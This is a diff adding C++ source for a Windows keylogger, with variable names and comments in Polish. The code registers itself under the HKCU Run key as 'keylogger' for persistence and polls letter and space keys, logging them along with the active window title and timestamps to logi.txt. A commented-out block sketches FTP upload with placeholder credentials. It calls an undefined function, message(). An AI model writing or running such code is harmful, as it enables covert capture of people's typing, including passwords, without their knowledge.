@@ -1,0 +1,105 @@
+#include <fstream>
+#include <cstdio>
+#include <stdio.h>
+#include <iostream>
+#include <ctime>
+#include <time.h>
+#include <cstring>
+#include <wchar.h>
+#include <windows.h>
+
+
+int i;
+int zapisik;
+time_t curTime = time(NULL);
+using namespace std;
+void Min_okna(){
+HWND okno = FindWindowA( "ConsoleWindowClass", NULL );
+ShowWindow( okno, SW_HIDE );}
+void autostart(){
+char filename[_MAX_PATH];
+GetModuleFileName(NULL, filename, _MAX_PATH);
+string regedit = "reg ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v keylogger /t REG_SZ /f /d ";
+regedit.append(filename);
+system(regedit.c_str());
+}
+/*void pobieranie(){
+HINTERNET hint,ftp;
+
+hint=InternetOpen("wpisz tu cokolwiek",INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,0);
+ftp=InternetConnect(hint, "adres do serwera ftp" ,INTERNET_DEFAULT_FTP_PORT,"loginl","haslo",INTERNET_SERVICE_FTP,INTERNET_FLAG_PASSIVE,101);
+--- pobieranie
+FtpGetFile(ftp,"nazwa pliku na serwerze","adres do miejsca zapisu na dysku",true, FILE_ATTRIBUTE_NORMAL, INTERNET_FLAG_TRANSFER_BINARY,0);
+---wysylanie
+FtpPutFile(ftp,"miejsce na dysku z ktorego wysylasz","nazwa pliku",FTP_TRANSFER_TYPE_BINARY,0);
+
+
+}*/
+void timer(){
+    if (difftime(time(NULL),curTime) > 60) {
+
+    curTime = time(NULL);
+    FILE *plik = fopen("logi.txt", "a");
+    time_t date = time(NULL);
+    char cWindow[MAX_PATH];
+    GetWindowText(GetForegroundWindow(), cWindow, sizeof(cWindow));
+    fprintf(plik,"\n%s\t",ctime(&date));
+    fprintf(plik,"\n%s\t",cWindow);
+    fclose(plik);
+    }
+}
+void zapistxt(int zapis){
+
+    FILE *plik = fopen("logi.txt", "a");
+
+    if (plik!=NULL)
+    {
+        fputc((char)zapis, plik);
+        fclose(plik);
+}
+    timer();
+}
+void petla(){
+char zapis;
+
+ while(true)
+    {
+        timer();
+
+        for(zapis = 65; zapis < 91; zapis++)
+        {
+            zapisik = GetAsyncKeyState(zapis);
+
+            if(zapisik==-32767 && !GetAsyncKeyState(VK_SHIFT))
+            {
+
+                zapistxt((zapis+32));
+            }
+                else if (zapisik==-32767 && GetAsyncKeyState(VK_SHIFT))
+            {
+                zapistxt(zapis);
+            }
+        }
+             if (GetAsyncKeyState(VK_SPACE)==-32767)
+        {
+            zapistxt(32);
+
+        }
+        if (GetAsyncKeyState(VK_SPACE)==-32767)
+        {
+            zapistxt(32);
+
+        }
+
+
+
+    }
+}
+int main(){
+    //Min_okna();
+    autostart();
+    petla();
+    message();
+    system("cls");
+    return 0;
+}
